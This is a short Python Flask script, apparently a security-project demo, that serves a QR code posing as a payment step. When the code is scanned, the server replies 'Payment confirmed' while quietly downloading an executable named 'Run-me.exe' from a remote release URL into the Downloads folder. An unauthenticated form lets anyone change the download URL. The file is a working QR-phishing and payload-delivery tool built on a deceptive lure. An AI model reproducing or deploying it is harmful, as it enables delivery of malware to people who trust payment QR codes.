from flask import Flask, send_file, render_template, request, redirect
import qrcode
import socket
import os
import threading
import requests
from pathlib import Path
import time

app = Flask(__name__)

DOWNLOAD_DIR = 'Downloads'
PORT = 3000
REMOTE_FILE_URL = 'https://github.com/nada1649/securityproject/releases/download/Test/Run-me.exe'

@app.route('/')
def control_panel():
    current_url = REMOTE_FILE_URL if REMOTE_FILE_URL else "Not set"
    timestamp = int(time.time())
    return render_template('index.html', current_url=current_url, timestamp=timestamp)

@app.route('/set-url', methods=['POST'])
def set_url():
    global REMOTE_FILE_URL
    REMOTE_FILE_URL = request.form['file_url']
    return redirect('/')

@app.route('/qrcode')
def serve_qr_code():
    file_path = generate_qr_code()
    return send_file(file_path, mimetype='image/png')

def generate_qr_code():
    url = f"http://{get_local_ip()}:{PORT}/trigger-download"

    qr = qrcode.QRCode(version=1, box_size=10, border=5)
    qr.add_data(url)
    qr.make(fit=True)
    img = qr.make_image(fill='black', back_color='white')

    if not os.path.exists('static'):
        os.makedirs('static')

    filename = f'qrcode.png'
    file_path = os.path.join('static', filename)

    img.save(file_path)

    # Clean up old QR codes
    for f in os.listdir('static'):
        if f.startswith('qrcode_') and f != filename:
            try:
                os.remove(os.path.join('static', f))
            except Exception:
                pass

    return file_path

@app.route('/trigger-download')
def trigger_download():
    if not REMOTE_FILE_URL:
        return "Error: No download URL set. Please set a URL first."
    
    threading.Thread(target=download_file_to_laptop).start()
    return "Payment confirmed"

def download_file_to_laptop():
    try:
        downloads_folder = os.path.join(os.path.expanduser("~"), "Downloads")
        Path(downloads_folder).mkdir(exist_ok=True)
        filename = "Run-me.exe"
        save_path = os.path.join(downloads_folder, filename)

        print(f"Downloading Exe from {REMOTE_FILE_URL}...")
        response = requests.get(REMOTE_FILE_URL, stream=True)
        response.raise_for_status()

        with open(save_path, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)

        print(f"File saved as {save_path}")
        return True
    except Exception as e:
        print(f"Download failed: {e}")
        return False

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('10.255.255.255', 1)) 
        ip = s.getsockname()[0]
    except Exception:
        ip = '127.0.0.1'
    finally:
        s.close()
    return ip

def run_server():
    ip = get_local_ip()
    generate_qr_code()
    print(f"Access the control panel at: http://{ip}:{PORT}")
    app.run(host=ip, port=PORT, debug=False)

if __name__ == '__main__':
    run_server()
